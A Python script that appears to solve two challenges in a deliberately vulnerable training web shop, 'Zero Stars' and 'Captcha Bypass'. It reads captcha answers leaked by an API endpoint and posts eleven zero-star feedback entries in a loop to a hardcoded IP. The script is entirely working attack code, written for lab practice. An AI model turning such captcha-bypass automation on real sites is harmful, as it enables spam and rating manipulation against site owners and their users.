from urllib.request import urlopen, Request
from json import dumps, load
from sys import exit

status = []
for a in range(11):
    response = urlopen(
        Request(
            "http://15.236.144.183:8082/rest/captcha/",
            headers={
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "Origin": "http://15.236.144.183:8082",
                "Referer": "http://15.236.144.183:8082/",
                "Cookie": (
                    "language=en; welcomebanner_status=dismiss;"
                    " continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
                    "TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
                    "_status=dismiss"
                ),
            },
        )
    )
    data = load(response)
    response = urlopen(
        Request(
            "http://15.236.144.183:8082/api/Feedbacks/",
            data=dumps({
                "captchaId": data["captchaId"],
                "captcha": data["answer"],
                "comment": "Comment (anonymous) !",
                "rating": 0,
            }).encode(),
            method="POST",
            headers={
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "Origin": "http://15.236.144.183:8082",
                "Referer": "http://15.236.144.183:8082/",
                "Cookie": (
                    "language=en; welcomebanner_status=dismiss;"
                    " continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
                    "TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
                    "_status=dismiss"
                ),
            },
        )
    )
    status.append(load(response)["status"])

if all(x == "success" for x in status):
    print("[+] Zero Stars exploited")
    print("[+] Captcha Bypass exploited")
    exit(0)
elif any(x == "success" for x in status):
    print("[+] Zero Stars exploited")
    print("[-] Captcha Bypass failed")
    exit(127)
else:
    print("[-] Zero Stars failed")
    print("[-] Zero Stars failed")
    exit(1)